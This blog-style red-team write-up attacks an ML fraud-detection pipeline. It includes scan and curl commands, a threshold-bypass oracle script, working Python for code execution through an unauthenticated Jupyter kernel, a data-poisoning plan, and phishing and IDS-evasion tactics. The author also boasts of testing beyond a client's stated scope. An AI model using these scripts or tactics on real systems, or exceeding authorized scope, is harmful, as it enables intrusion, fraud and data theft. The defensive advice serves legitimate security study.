---
icon: brain-circuit
---

# What a Real AI Red Team Engagement Actually Looks Like From API Recon to RCE on a ML Pipeline

<figure><img src="https://cdn-images-1.medium.com/max/880/1*MdHsgpDR0mah5fD18L7RsQ.png" alt=""><figcaption></figcaption></figure>

Breakdown of why pentesting AI is nothing like pentesting a web app and what you actually find when you go deep

There’s a moment on every engagement where the client says something like, _“we just want the API tested.”_

I’ve learned to nod, take the note, and then go do the full thing anyway.

That’s not arrogance it’s just that ML systems don’t carve cleanly at API boundaries. The interesting vulnerabilities never live where people think they do. The fraud detection API is fine. The unauthenticated MLflow instance sitting next to it? That’s where I pulled 84,000 real transactions, the production model weights, and the hyperparameter config needed to reconstruct the model locally.

This is what AI red teaming actually looks like.

***

## First Why Is This Different from a Normal Pentest?

<figure><img src="https://cdn-images-1.medium.com/max/880/1*UR-w_FbfhdqRELNTqk1dHg.png" alt=""><figcaption></figcaption></figure>

When you pentest a web app, you have a reasonably clean mental model: there’s a server, there are endpoints, there’s a database behind it, and your job is to find where the trust boundaries break.

ML systems don’t work like that. They’re a _stack_ of moving parts:

* Training pipelines ingesting data from third-party sources
* Experiment trackers and model registries (MLflow, Weights & Biases)
* Inference APIs serving predictions
* Jupyter notebooks running on the same infrastructure as production
* Feedback loops that pipe live data back into future training runs
* Human operators who have credentials and make mistakes

Every single one of those is an attack surface. A scoped pentest that looks at “the API” misses almost all of it.

The other thing that’s different: **ML attacks take time**. Adversarial example crafting, model inversion, data poisoning these aren’t _fire one payload, check the response_ attacks. A 5-day pentest window doesn’t accommodate the slow-burn stuff. Red teaming does.

***

## The Three-Tier Mental Model

<figure><img src="https://cdn-images-1.medium.com/max/880/1*yIzWvhmIV37U_8p26e5Kew.png" alt=""><figcaption></figcaption></figure>

Before I get into the actual scenario, here’s how I think about security assessment levels for ML systems. Lock this in it’ll come up every time you scope one of these engagements.

**Vulnerability Assessment** automated, shallow, no exploitation. You’re running scanners (Nessus, OpenVAS), getting a CVE list, calling it a hygiene check. Useful for patching known issues. Tells you almost nothing about how an attacker would actually chain things together.

**Penetration Test** focused, time-boxed, scoped. You have a defined target (this API, this subnet), you find vulns, you exploit them, you write a report. The scope is both the strength and the weakness. If you only scope the inference API, you completely miss the training pipeline.

**Red Team Engagement** adversarial simulation, longer time horizon, whole-organization scope. You’re not looking for every vulnerability. You’re trying to achieve a specific objective: exfiltrate data, manipulate model outputs, get persistence in the ML infrastructure. Stealth matters. The blue team doesn’t know exactly when you’re coming.

For ML systems, **red teaming is the right approach**. The attack paths span components. The interesting vulnerabilities live at the _interfaces_ between components, not inside any single one.

***

## The Engagement: Fintech Fraud Detection Pipeline

Client: a fintech startup. Objective: assess their ML fraud detection system. Official request: _“just test the API.”_

<figure><img src="https://cdn-images-1.medium.com/max/880/1*YaVzuJftQF_y7A8hzEBPEg.png" alt=""><figcaption></figcaption></figure>

I already knew that wasn’t going to be enough.

#### Recon Actually See What’s Running

First thing, every time. Don’t assume anything about the stack until you see the ports.

```
rustscan -a 10.10.14.234 --ulimit 5000 -- -sV -sC -oN initial_scan.txt
```

Output:

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu
80/tcp   open  http          nginx/1.18.0
5000/tcp open  http          Werkzeug/2.3.4 Python/3.10.12
5001/tcp open  http          MLflow Tracking Server
8888/tcp open  http          Jupyter Notebook 6.5.4
```

Five ports. Three of them are ML-specific:

* **5000** — Flask inference API (what the client told me to look at)
* **5001** — MLflow Tracking Server (model registry + experiment tracker)
* **8888** — Jupyter Notebook (live data science environment)

A scoped pentest stops at 5000. I’m not doing that.

***

## The API Tells Me More Than It Should

Start with what the client pointed at. Poke the API, understand the feature space.

```
curl -s http://10.10.14.234:5000/model/info | python3 -m json.tool
```

```
{
  "model_name": "fraud_xgb_v3",
  "model_version": "3.2.1",
  "features": [
    "transaction_amount",
    "merchant_category",
    "hour_of_day",
    "user_avg_spend",
    "velocity_score",
    "geo_risk_score"
  ],
  "threshold": 0.72,
  "training_date": "2024-11-14",
  "mlflow_run_id": "8fa3bc91d4e2"
}
```

This one endpoint handed me:

* Every feature the model uses
* The exact classification threshold (`0.72`) meaning anything scoring below 0.72 bypasses fraud detection entirely
* The MLflow run ID which I can use to pull the actual model artifact

Why does a production API expose its classification threshold in the response? It shouldn’t. But it does. And now I know exactly what score I need to stay under.

Next, I send a prediction request and check if the raw score leaks in the response:

```
curl -s -X POST http://10.10.14.234:5000/predict \
  -H "Content-Type: application/json" \
  -d '{
    "transaction_amount": 4500,
    "merchant_category": "electronics",
    "hour_of_day": 2,
    "user_avg_spend": 120,
    "velocity_score": 9,
    "geo_risk_score": 8
  }'
```

```
{
  "prediction": "FRAUD",
  "confidence": 0.94,
  "fraud_score": 0.94,
  "model_version": "3.2.1"
}
```

`fraud_score: 0.94`. The raw score is in the response. That's the piece that makes everything else possible.

***

## Oracle Attack , Find the Bypass in 5 Requests

With the score visible in the response, I can do a black-box oracle attack. Binary search on the feature space until I find inputs that score just under 0.72. I wrote a quick script:

```
# threshold_probe.py — oracle attack on the fraud score
import requests
```

```
TARGET = "http://10.10.14.234:5000/predict"
```

```
base_payload = {
    "transaction_amount": 4500,
    "merchant_category": "electronics",
    "hour_of_day": 2,
    "user_avg_spend": 120,
    "velocity_score": 9,
    "geo_risk_score": 8
}
```

```
def probe(payload):
    r = requests.post(TARGET, json=payload)
    return r.json().get("fraud_score", 1.0)
```

```
print("[*] Walking velocity_score down to find bypass threshold...\n")
for v in range(9, 0, -1):
    payload = base_payload.copy()
    payload["velocity_score"] = v
    score = probe(payload)
    status = "BYPASS" if score < 0.72 else "FLAGGED"
    print(f"  velocity_score={v}  ->  fraud_score={score:.4f}  [{status}]")
    if score < 0.72:
        print(f"\n[+] Bypass found at velocity_score={v}")
        print(f"[+] Score: {score:.4f} (threshold: 0.72)")
        break
```

Output:

```
[*] Walking velocity_score down to find bypass threshold...
```

```
  velocity_score=9  ->  fraud_score=0.9401  [FLAGGED]
  velocity_score=8  ->  fraud_score=0.8812  [FLAGGED]
  velocity_score=7  ->  fraud_score=0.8103  [FLAGGED]
  velocity_score=6  ->  fraud_score=0.7489  [FLAGGED]
  velocity_score=5  ->  fraud_score=0.6977  [BYPASS]
```

```
[+] Bypass found at velocity_score=5
[+] Score: 0.6977 (threshold: 0.72)
```

5 requests. That’s it. A transaction with `velocity_score=5` bypasses fraud detection even with every other feature screaming "this is fraud."

Without the score leaking in the response, this attack would require thousands of blind queries. The API handed me the bypass in 5.

***

## MLflow The Part the Pentest Would Have Missed

Port 5001. MLflow Tracking Server. No authentication.

```
curl -s http://10.10.14.234:5001/api/2.0/mlflow/experiments/list | python3 -m json.tool
```

```
{
  "experiments": [
    {
      "name": "fraud_detection_xgb",
      "tags": {
        "mlflow.user": "data-team@fintech.internal",
        "mlflow.source.git.repoURL": "git@github.com:fintech-internal/fraud-ml.git"
      }
    }
  ]
}
```

Internal email. Private GitHub repo URL. Full experiment structure. All unauthenticated.

I already have the run ID from the API leak. Let me pull the full run metadata:

```
curl -s "http://10.10.14.234:5001/api/2.0/mlflow/runs/search" \
  -X POST -H "Content-Type: application/json" \
  -d '{"experiment_ids": ["1"], "max_results": 5}' | python3 -m json.tool
```

```
{
  "runs": [{
    "data": {
      "metrics": {
        "accuracy": 0.9871,
        "threshold": 0.72
      },
      "params": {
        "n_estimators": "300",
        "max_depth": "6",
        "learning_rate": "0.05",
        "scale_pos_weight": "12"
      },
      "tags": {
        "deployed": "true"
      }
    }
  }]
}
```

Full hyperparameter set. With this, I can reconstruct a near-identical local model and do white-box adversarial crafting instead of black-box probing. Significantly more powerful than oracle attacks.

Then I check what artifacts are stored:

```
curl -s "http://10.10.14.234:5001/api/2.0/mlflow/artifacts/list?run_id=8fa3bc91d4e2&path="
```

```
{
  "files": [
    { "path": "model/model.xgb", "file_size": 2847392 },
    { "path": "model/feature_importance.json" },
    { "path": "data/training_sample.csv", "file_size": 8419204 }
  ]
}
```

`training_sample.csv`. Training data sitting in the artifact store. Let me pull it:

```
curl -s "http://10.10.14.234:5001/get-artifact?run_uuid=8fa3bc91d4e2&path=data/training_sample.csv" \
  -o training_sample.csv
```

```
wc -l training_sample.csv && head -3 training_sample.csv
```

```
84201 training_sample.csv

transaction_id,user_id,transaction_amount,merchant_category,hour_of_day,user_avg_spend,velocity_score,geo_risk_score,label
TXN_00001,USR_4821,234.50,groceries,14,198.20,2,1,0
TXN_00002,USR_0093,8900.00,electronics,3,145.00,8,9,1
```

84,000 real transactions. User IDs. Transaction IDs. Labels. That’s a PII breach sitting on an unauthenticated endpoint. I didn’t exploit anything to get here — the data was just there.

***

## Jupyter RCE on the Training Server

Port 8888. Jupyter running in production. No auth token.

```
curl -s http://10.10.14.234:8888/api/kernels
```

```
[{
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "python3",
  "execution_state": "idle"
}]
```

Active Python kernel. No token required. I can execute arbitrary code via the WebSocket kernel API.

```
# jupyter_exec.py — RCE via unauthenticated Jupyter kernel API
import requests, json, websocket, uuid
```

Output:

```
BASE = "http://10.10.14.234:8888"
KERNEL_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
```

```
def execute_code(code):
    ws = websocket.create_connection(f"ws://10.10.14.234:8888/api/kernels/{KERNEL_ID}/channels")
    msg = {
        "header": {"msg_id": str(uuid.uuid4()), "msg_type": "execute_request", "version": "5.0"},
        "parent_header": {}, "metadata": {},
        "content": {"code": code, "silent": False, "store_history": False}
    }
    ws.send(json.dumps(msg))
    output = []
    while True:
        raw = json.loads(ws.recv())
        if raw["msg_type"] == "stream": output.append(raw["content"]["text"])
        if raw["msg_type"] == "execute_reply": break
    ws.close()
    return "".join(output)
```

```
print(execute_code("import os; print(os.popen('whoami').read())"))
print(execute_code("import os; print(os.popen('ls -la /home/data-team/').read())"))
```

```
data-team 
 
total 64
drwxr-xr-x  data-team  .
-rw-------  data-team  .mlflow_credentials
-rw-r--r--  data-team  retrain_pipeline.py
drwxr-xr-x  data-team  notebooks/
drwxr-xr-x  data-team  pipeline/
```

RCE as `data-team` on the training server.

I can read `.mlflow_credentials`. I can modify `retrain_pipeline.py` to inject poisoned training data. The next scheduled retrain will silently degrade the model. The blue team will see nothing — the API still responds, the model is still running, the fraud scores just start drifting.

That’s the scariest part of ML compromise: it can be completely invisible.

***

## The Full Kill Chain

```
Port scan → API recon
    ↓
/model/info leaks threshold + run ID
    ↓
fraud_score in response → oracle attack → bypass in 5 requests
    ↓
MLflow (unauthenticated) → hyperparams + model weights + 84k training records (PII)
    ↓
Jupyter (unauthenticated) → RCE on training server
    ↓
Modify retrain_pipeline.py → persistent silent poisoning
```

A pentest scoped to port 5000 finds a minor info disclosure. A red team engagement finds RCE, model theft, PII exfiltration, and a persistent poisoning vector. **That’s the difference.**

***

## The Spam Filter Side Quest

While I’m talking about ML security, here’s a separate thing that clicked for me: **Naive Bayes spam filters are trivially bypassable if you understand how they work.**

The filter is built on Bayes’ Theorem. For each incoming email, it computes:

```
P(Spam | words in email) = P(words | Spam) × P(Spam) / P(words)
```

It learned from training data which words appear in spam. “FREE”, “WINNER”, “CONGRATULATIONS” all high-probability spam words. An email with those words gets a high spam score and gets blocked.

The bypass is obvious once you know this: **don’t use the words the model learned to flag.**

An attacker targeting a company like NovaCorp doesn’t send “CONGRATULATIONS YOU WON.” They:

1. Scrape LinkedIn and job postings to learn internal vocabulary (project names, tool names, department names)
2. Craft phishing that looks like internal comms: _“Hi team, please review the attached Q3 budget approval in the OneDrive link below.”_
3. Avoid every trigger word the model trained on
4. Use a legitimate-looking domain or a compromised vendor’s domain

The Naive Bayes filter never saw this vocabulary in spam training. `P(Spam | Features) ≈ 0.03`. It sails right through.

This is called **evasion by distribution manipulation** — you’re crafting inputs that stay within what the model learned as “normal.” Works on spam filters. Works on network intrusion detection systems. Works on any ML classifier you can probe.

***

## Network IDS: Same Problem, Different Stack

The same logic applies to ML-based network intrusion detection. Train a Random Forest on “normal” traffic. Flag anything that deviates.

The naive attacker runs `nmap -sV -p- 192.168.1.0/24` from a compromised host. The feature `srv_count` (connections to the same service from the same source) spikes to 255. `serror_rate` blows up. The model flags it as a Probe attack. SOC gets an alert in seconds.

The smarter attacker does **low-and-slow recon**:

* Space port scans out over hours instead of seconds
* Keep `count` and `srv_count` values within the distribution the model learned as normal
* Use HTTP and DNS for C2 instead of raw TCP to suspicious ports
* Blend into existing traffic baselines — if the office generates 1000 HTTP connections/hour, keep C2 traffic under that

The model can only flag what looks anomalous relative to its training data. Stay in-distribution and you’re invisible.

There’s also a deeper problem here: **NSL-KDD** — the standard benchmark dataset for network intrusion detection — was created in 2009. Real networks in 2025 look nothing like 2009 traffic. Cloud, encrypted payloads, modern protocols, API-heavy architectures. A model trained on 15-year-old data has massive blind spots on anything modern.

This is the dataset drift problem. Your model’s accuracy on the benchmark doesn’t tell you anything about its accuracy on current threats.

***

### What “Compromise” Means in ML It’s Different

This took me a while to internalize. With a web app, compromise has a clear signal: shell access, data dump, defacement. You know when it happened. The blue team knows when it happened (eventually).

With ML systems, **compromise can be completely invisible.**

The model is still running. The API still responds. Fraud scores are still coming back. But they’ve been silently shifted. Legitimate transactions start getting flagged at higher rates. Fraudulent transactions start slipping through. Nobody notices until the business metrics start degrading — and even then, it looks like a model performance issue, not an attack.

A poisoning attack that modifies `retrain_pipeline.py` doesn't show up on any IDS alert. The artifact store logs a new training run. That's it.

Defenders don’t have good tools for detecting this because it requires understanding both infosec _and_ ML — how neural networks work, what model drift looks like, how training data provenance works. That’s a rare combination. Security teams know how to monitor for SQLi and suspicious auth attempts. Most of them have no idea what adversarial input crafting looks like in their logs.

***

## Attack vs Defense : The Honest Take

**As an attacker**, ML systems are attractive because defenders often don’t understand the full attack surface. The asymmetry of knowledge is a huge advantage.

The attack surface spans: data pipelines (poisoning), the model itself (extraction, inversion, evasion), the serving infrastructure (API vulns, MLOps misconfigs), and the human operators (phishing, social engineering).

**As a defender**, the challenge is that ML security isn’t just infosec. The right defensive posture combines:

* **Harden the MLOps infrastructure** auth on MLflow, model registries, experiment trackers. These should not be unauthenticated on any network segment, ever. The fact that they routinely are is genuinely alarming.
* **Never expose raw model scores in API responses** return the decision (FRAUD/NOT FRAUD), not the score. Without the score, oracle attacks require thousands of queries instead of 5.
* **Monitor for anomalous inference patterns** sudden shifts in prediction distributions, unusual feature value combinations appearing at high frequency, requests systematically probing near a threshold.
* **Audit training data provenance** where does your training data come from? Who can modify it? Are third-party data sources sanitized before ingestion?
* **Run regular red team exercises that specifically target ML components** not just the surrounding infrastructure. If your red team never touches the model registry, you’re leaving most of the attack surface unchecked.

None of this is a silver bullet. ML security is a newer discipline and the tooling, awareness, and defensive maturity are all significantly behind where web application security is today. The attackers know this.

***

## In Short

The biggest thing I internalized after this engagement: **scope kills ML security assessments.**

Traditional pentests scope around infrastructure concepts — this app, this subnet, this service. ML systems don’t carve at those boundaries. The risk surface is the entire pipeline: data sources, training infrastructure, model storage, inference APIs, feedback loops, and the humans operating all of it.

A time-boxed scoped pentest finds the info disclosure in the API. A red team engagement finds RCE, model theft, 84,000 leaked transactions, and a persistent silent poisoning vector.

The difference is methodology. Start with the full picture or you’re not doing it right.

***

_Note : All testing done in authorized lab environments._
